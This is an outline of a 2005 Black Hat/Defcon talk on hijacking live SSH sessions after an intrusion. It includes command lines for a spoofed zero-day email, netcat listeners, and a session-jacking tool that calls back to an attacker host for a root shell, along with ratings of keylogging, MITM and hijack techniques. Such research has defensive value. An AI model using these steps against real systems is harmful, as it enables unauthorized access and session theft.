### Trust Transience: Post-Intrusion SSH Hijacking

**Presented at Blackhat USA 2005 & Defcon 13**

#### Introduction
- **Presenter:** Metlstorm / Adam
- **Location:** New Zealand
- **Background:**
  - Linux systems integrator
  - Former corporate security consultant, ISP security, and NOC technician
  - "No, I don't know any hobbits, you sad Tolkien fanboi."

#### The Target
- **Reconnaissance:**
  - Mail headers indicate the MUA is PINE.
  - .sig file shows Debian Sarge with kernel 2.4.22.
  - Web logs show egress HTTPS traffic without a proxy (no forwarded-for header).

#### The Plan
- **Execution:**
  - Set up a netcat listener: `haxor:~$ nc -l -p 1337`
  - Identify the user: `admin@box:~$ id` -> `uid=1004(admin) gid=1004(admin) groups=1004(admin)`
  - Check if PINE is running: `admin@box:~$ ps auxw | grep -q pine || echo shit` -> `shit`
  - Verify the presence of a core dump: `admin@box:~$ ls core` -> `core`
  - Check the kernel version: `admin@box:~$ uname -nsr` -> `Linux box 2.6.11`
  - Send an email with a zero-day exploit: `haxor:~$ ./pine0day | spoofmail -f 'Mr. Mbeki' -s 'Opportunity for joo!' PI:EMAIL`

#### Things Start to Unravel
- **Session Monitoring:**
  - `admin@box:~$ w` -> Shows multiple active sessions.
  - `admin@box:~$ ps x` -> Lists running processes.

- **Situation:**
  - No root access.
  - Risk of being detected.
  - Consider dropping the carrier and running.
  - But the SSH session is so close...

#### There Is a Way
- **SSH Jacking:**
  - Use a custom script to hijack the SSH session.
  - `admin@box:~$ :!!!!mafl-load ssh-jack 3597 haxor.com 1338`
  - Connect to the SSH process and locate necessary symbols and sections.
  - Inject a stub into the SSH process to gain control.

- **Result:**
  - `haxor:~$ nc -l -p 1338`
  - `root@ns1:~# echo pwned!` -> `pwned!`

#### Intrusion Overview
- **Attack Method:**
  - Attack servers via the administrators.
  - Complexity often leads to insecurity.
  - When things go wrong, adaptability is key.

- **Post-Intrusion Goals:**
  - Privilege escalation.
  - Stealth and consolidation.
  - Further reconnaissance and penetration.
  - Guerrilla tactics: hit and fade, keep it moving.

- **Adaptability:**
  - Core difference between hackers and script kiddies.
  - Example: Markus Hess's failure to adapt.

#### Cross-Host Privilege Escalation
- **Local vs. Remote:**
  - Local root can be a distraction.
  - Exploiting local vulnerabilities is easier but not always the best option.
  - Trust relationships offer another path.

- **Trust Relationships:**
  - Traditional methods: rhosts, ports < 1024, exporting directories.
  - Instant gratification, no waiting for user interaction.
  - Nostalgia for old-school hacking techniques.

#### Non-Transient vs. Transient Trusts
- **Non-Transient Trusts:**
  - Fixed trusts like rhosts and SSH keys.
  - Stored authentication credentials.
  - One-factor authentication.
  - Authentication based on connection properties (e.g., source IP, port).

- **Transient Trusts:**
  - Exist only for a period of time.
  - Open, post-authentication sessions.
  - Any cross-privilege boundary connection has some transient trust.

#### Exploit Metrics
- **Evaluation:**
  - Ease, stealth, timing, and feasibility.
  - Assume non-root shell on a client machine.

- **Exploitation Techniques:**
  - **Pretend to be Client A:**
    - Ease: 10
    - Stealth: 10
    - Timing: 10
    - Feasibility: 2
  - **Keylogging:**
    - During authentication: Obtain User A's password.
    - Later: Impersonate User A.
    - Ease: 7
    - Stealth: 8
    - Timing: 3
    - Feasibility: 7
  - **Man-in-the-Middle (MITM):**
    - During authentication: Impersonate server and client.
    - Later: Monitor and take over the session.
    - Ease: 5
    - Stealth: 4
    - Timing: 3
    - Feasibility: 5
  - **TCP Hijack:**
    - Later: Predict TCP sequence numbers and take over the session.
    - Ease: 3
    - Stealth: 1
    - Timing: 7
    - Feasibility: 2
  - **Application Hijack:**
    - Later: Take control of the network client application and sneak down the authenticated session.
    - Ease: 8
    - Stealth: 8
    - Timing: 7
    - Feasibility: 7

#### The SSH 'Jacker
- **Overview:**
  - A Python script that gives a shell at the other end of a running SSH session.
  - Implementation details, anti-forensics, and mitigation strategies.
  - Future improvements and directions.

- **How It Works:**
  - Reuse SSH features for malicious purposes.
  - Glue a socket to a second shell, add an Evil Hax0r, and mix well.
  - Use Python and GDB/MI for implementation.

- **Rich Protocols: SSH:**
  - Goal: Hijack the session while in active use without detection.
  - Virtual channel infrastructure makes it seamless.

- **Conclusion:**
  - Transient trusts are almost as fun as the real thing.
  - Graph comparing different techniques: SSH jacking, keylogging, TCP hijacking, MITM, and transient trust.

- **Final Thoughts:**
  - Adaptability is key in post-intrusion scenarios.
  - Creative reapplication of known techniques can lead to successful attacks.